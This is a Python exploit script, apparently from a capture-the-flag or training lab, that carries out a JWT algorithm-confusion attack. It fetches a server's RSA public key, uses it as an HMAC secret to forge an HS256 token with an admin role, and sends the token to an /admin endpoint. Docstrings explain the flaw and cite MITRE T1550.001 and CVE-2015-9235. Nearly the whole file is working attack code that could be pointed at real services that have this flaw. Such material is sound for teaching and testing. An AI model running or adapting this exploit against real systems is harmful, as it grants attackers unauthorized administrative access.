"""
attack_confusion.py — Attack 2: RS256 → HS256 Algorithm Confusion
==================================================================
MITRE ATT&CK: T1550.001 — Use Alternate Authentication Material
CVE reference: CVE-2015-9235 (node-jsonwebtoken), Auth0 SDK confusion (2022)

HOW IT WORKS:
  RS256 is ASYMMETRIC — private key signs, public key verifies. Different keys.
  HS256 is SYMMETRIC  — one shared secret does BOTH signing and verifying.

  A vulnerable server that accepts both RS256 and HS256 can be tricked:
    - The server verifies HS256 tokens using its RSA PUBLIC key as the HMAC secret.
    - The attacker fetches that public key from /public-key (it is intentionally public).
    - The attacker signs a forged token with HS256 using that same public key.
    - The server verifies with its public key — same key the attacker used — and accepts it.

  The attacker never touches the private key. They only need what is already public.

IMPACT: Admin access using only the server's public key.

Run against vulnerable server:  python attack_confusion.py
Expected result: HTTP 200 + flag{jwt_alg_confusion_2025}
"""

import base64
import hashlib
import hmac
import json
import requests

TARGET = "http://10.236.147.152:5000"  # vulnerable server IP — change if needed


def b64url_encode(data: dict) -> str:
    """base64url encode without padding — required by the JWT spec."""
    return (
        base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode())
        .rstrip(b"=")
        .decode()
    )


def forge_hs256_token(public_key_pem: str) -> str:
    """
    Forge an HS256 JWT signed with the server's PUBLIC key as the HMAC secret.

    The server will verify this token using its own public key — the same key
    we used to sign it — and accept it as valid.

    This works because the vulnerable server accepts both RS256 and HS256,
    and uses PUBLIC_KEY as the verification key for HS256 tokens.
    """
    header = b64url_encode({"alg": "HS256", "typ": "JWT"})
    payload = b64url_encode({"user": "attacker", "role": "admin"})

    signing_input = f"{header}.{payload}".encode("utf-8")

    # Sign with the PUBLIC key as HMAC-SHA256 secret
    sig = hmac.new(
        public_key_pem.encode("utf-8"),
        signing_input,
        hashlib.sha256,
    ).digest()

    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{header}.{payload}.{sig_b64}"


def attack_confusion():
    print("\n" + "=" * 60)
    print("  ATTACK 2 — RS256 to HS256 Algorithm Confusion")
    print("  MITRE T1550.001 | CVE-2015-9235 | Auth0 2022")
    print("=" * 60)

    # Step 1: fetch the public key — no auth needed, it is intentionally public
    print(f"\n[+] Fetching public key from {TARGET}/public-key ...")
    pub_key = requests.get(f"{TARGET}/public-key").text
    print(f"[+] Got public key ({len(pub_key)} bytes):")
    print(f"    {pub_key[:80]}...")

    # Step 2: forge token — sign with HS256 using public key as HMAC secret
    forged = forge_hs256_token(pub_key)
    print(f"\n[+] Forged HS256 token: {forged[:60]}...")
    print(f"[+] Full forged token:\n    {forged}\n")

    # Step 3: hit /admin — server verifies with public key = same key we used
    r = requests.get(
        f"{TARGET}/admin",
        headers={"Authorization": f"Bearer {forged}"},
    )
    print(f"[RESULT] HTTP {r.status_code}")
    print(f"[RESULT] {r.json()}")

    if r.status_code == 200:
        print("\n[!!!] ATTACK SUCCESSFUL — admin access using only the public key")
        print("[!!!] Private key never needed. No brute force. No guessing.")
    else:
        print("\n[---] Attack blocked — server is patched")


if __name__ == "__main__":
    attack_confusion()
